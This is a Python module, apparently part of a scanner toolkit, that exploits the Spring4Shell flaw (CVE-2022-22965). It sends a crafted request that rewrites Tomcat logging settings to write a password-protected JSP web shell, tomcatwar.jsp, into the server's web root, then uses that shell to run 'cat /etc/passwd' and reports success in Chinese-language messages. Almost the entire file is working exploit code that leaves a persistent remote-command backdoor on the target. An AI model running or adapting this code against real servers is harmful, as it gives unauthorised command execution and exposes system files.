import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
                   'suffix':'%>//',
                   'c1':'Runtime',
                   'c2':'<%',
                   'DNT':'1'}
        log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
        log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
        log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
        log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        poc = "?" + "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
        logging.captureWarnings(True)
        requests.get(url1+poc,cookies=s_cookie,headers=headers,proxies=proxies,verify=False, timeout=5)
        time.sleep(5)
        target_url = urljoin(url1, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
        logging.captureWarnings(True)
        aa1 = requests.get(target_url, cookies=s_cookie, headers=headers, proxies=proxies, verify=False, timeout=5)
        if aa1.status_code == 200 and "root:" in aa1.text:
            cdd='\n[+]漏洞存在'.format(target_url)
        else:
            cdd='\n[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring CVE-2022-22965 ]\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)